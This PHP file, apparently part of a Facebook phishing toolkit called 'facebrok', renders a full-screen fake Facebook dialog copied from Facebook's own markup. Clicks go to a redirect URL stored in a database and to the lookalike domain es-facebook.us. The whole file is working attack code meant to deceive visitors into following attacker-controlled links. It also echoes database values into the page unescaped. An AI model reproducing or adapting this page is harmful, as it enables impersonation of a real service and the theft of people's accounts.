<?php
// RedToor
// Project facebrok
error_reporting(E_ALL ^ E_NOTICE);
// Language--------------------------------
$lang=$_POST['idio'];
if ($lang=='')
{ 
include("croak/config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
// Check URL 
$sql=mysql_query("SELECT * FROM methods WHERE id=3") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$lang=''.$row['value'].''; 
// -- END --
} else {$lang=$lang;}
// Languages------------------------------
include("lang.php");
//----------------------------------------
// Consults
$red=mysql_query ("SELECT * FROM methods" ) or die ('Failed Consult: '.mysql_error());
//-----------------------------------
// Escaping
$red=mysql_fetch_assoc($red);
$var=$red['value'];
include("head.php");
?>
<style>
    * {
      margin: 0; padding: 0;
    }
    
    html { 
      background: url(hrxPKHl.png) no-repeat center center fixed; 
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }
</style>
<body bgcolor="#FFFFFF" topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" scroll="no">
<a href="<?php echo"$var"?>">
<div class="generic_dialog pop_dialog generic_dialog_modal" id="dialog_1"><div class="generic_dialog_popup" style="margin-top: 125px;"><div class="pop_container_advanced"><div class="pop_content" id="pop_content" tabindex="0" role="alertdialog"><h2 class="dialog_title" id="title_dialog_1"><span><?php echo"$msw"?></span></h2><div class="dialog_content"><div class="dialog_summary hidden_elem"></div><div class="dialog_body"><?php echo"$msk"?></div><div class="dialog_buttons clearfix"><div class="rfloat mlm"><label class="uiButton uiButtonLarge uiButtonConfirm"><input type="button" name="#" <a="" href="http://www.es-facebook.us/" value="<?php echo"$j"?>"></label></div><div class="dialog_buttons_msg"></div></div><div class="dialog_footer hidden_elem"></div></div></div></div></div></div></a></body>